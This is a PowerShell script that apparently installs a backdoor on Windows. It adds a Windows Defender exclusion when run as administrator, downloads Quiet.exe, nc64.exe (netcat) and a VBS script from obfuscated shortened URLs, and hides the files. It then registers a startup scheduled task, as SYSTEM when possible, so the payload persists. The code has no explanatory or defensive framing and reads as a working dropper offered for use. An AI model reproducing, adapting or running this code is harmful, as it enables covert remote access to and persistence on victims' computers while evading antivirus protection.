# Check if the script is running as an Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Write-Output "Running as Administrator"

    # Admin rights detected
    $installPath = "C:\Windows"
    $scriptVbsUrl = "https://rb.gy/w3a7hb"

    # Windows Defender Exclusion
    Add-MpPreference -ExclusionPath $installPath
} else {
    Write-Output "Not running as Administrator"

    # No admin rights
    $installPath = Join-Path $env:USERPROFILE "System"
    $scriptVbsUrl = "https://rb.gy/3lld2p"
}

# Create the installation directory if it doesn't exist
if (-not (Test-Path $installPath)) {
    try {
        New-Item -ItemType Directory -Path $installPath -Force | Out-Null
    } catch {
        Write-Output "Failed to create directory: $_"
        exit
    }
}

# File download paths
$quietTxtPath = Join-Path $installPath "Quiet.exe"
$nc64TxtPath = Join-Path $installPath "nc64.exe"
$scriptVbsPath = Join-Path $installPath "script.vbs"

# URLs for Quiet.exe and nc64.exe
$quietTxtUrl = "https://rb.gy/mx0i5"
$nc64TxtUrl = "https://rb.gy/guty9"

# Download files
try {
    Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
    Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
    Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
} catch {
    Write-Output "Failed to download files: $_"
    exit
}

# Make the downloaded files hidden
try {
    attrib +H $quietTxtPath
    attrib +H $nc64TxtPath
    attrib +H $scriptVbsPath
} catch {
    Write-Output "Failed to hide files: $_"
    exit
}

# Create a scheduled task to run script.vbs at startup
try {
    $action = New-ScheduledTaskAction -Execute $scriptVbsPath
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd

    if ($isAdmin) {
        # If admin rights, run as NT AUTHORITY\SYSTEM
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

        # Register the task with SYSTEM account
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "system-ns" -Principal $principal -Settings $settings -Force
    } else {
        # If not admin, use your method to create the task
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "YourTaskName" -Settings $settings
    }
} catch {
    Write-Output "Failed to register scheduled task: $_"
}
